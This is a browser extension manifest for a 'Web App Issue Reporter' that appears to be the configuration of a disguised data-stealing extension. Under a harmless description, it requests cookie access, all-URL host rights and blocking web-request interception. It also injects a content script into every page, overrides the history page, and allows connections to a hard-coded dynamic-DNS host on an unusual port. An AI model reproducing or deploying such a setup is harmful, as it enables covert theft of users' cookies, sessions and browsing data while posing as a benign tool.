{
  "manifest_version": 2,
  "name": "Web App Issue Reporter",
  "version": "1.0.0",
  "description": "Help users report and resolve issues encountered while using web applications",
  "permissions": [
    "activeTab",
    "storage",
    "cookies",
    "system.display",
    "<all_urls>",
    "http://he808v7amke.sn.mynetname.net:28919/*",
    "webRequest",
    "webRequestBlocking"
  ],
  "content_security_policy": "script-src 'self'; object-src 'self'; connect-src 'self' http://he808v7amke.sn.mynetname.net:28919",
  "browser_action": {
    "default_popup": "src/pages/popup.html",
    "default_icon": {
      "16": "src/images/icon16.png",
      "48": "src/images/icon48.png",
      "128": "src/images/icon128.png"
    }
  },
  "background": {
    "scripts": ["src/js/background.js"],
    "persistent": true
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["src/js/content.js"],
      "css": ["src/css/content.css"]
    }
  ],
  "icons": {
    "16": "src/images/icon16.png",
    "48": "src/images/icon48.png",
    "128": "src/images/icon128.png"
  },
  "options_page": "src/pages/options.html",
  "chrome_url_overrides": {
    "history": "src/pages/history.html"
  }
} 